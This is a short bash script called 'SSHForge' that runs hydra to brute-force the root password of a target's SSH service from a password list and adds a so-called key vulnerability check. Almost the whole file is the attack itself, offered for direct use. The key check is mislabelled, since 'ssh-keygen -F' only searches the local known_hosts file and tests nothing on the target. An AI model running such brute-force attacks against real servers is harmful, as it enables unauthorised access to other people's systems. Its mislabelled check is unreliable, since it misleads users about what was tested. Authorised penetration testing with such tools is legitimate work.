#!/bin/bash

# SSHForge - SSH Brute Force and Weak Password Checker

target=$1

if [ -z "$target" ]; then
  echo "Usage: ./SSHForge.sh <target>"
  exit 1
fi

# Function to brute force SSH passwords
brute_force_ssh() {
  echo "Brute-forcing SSH on $target..."
  hydra -l root -P /path/to/passwords.txt ssh://$target
}

# Check for SSH key-based vulnerabilities
check_ssh_key_vulnerability() {
  echo "Checking for SSH key vulnerabilities..."
  ssh-keygen -F $target
}

# Run brute force and key check
brute_force_ssh &
check_ssh_key_vulnerability &

wait
echo "SSH vulnerability scan complete."
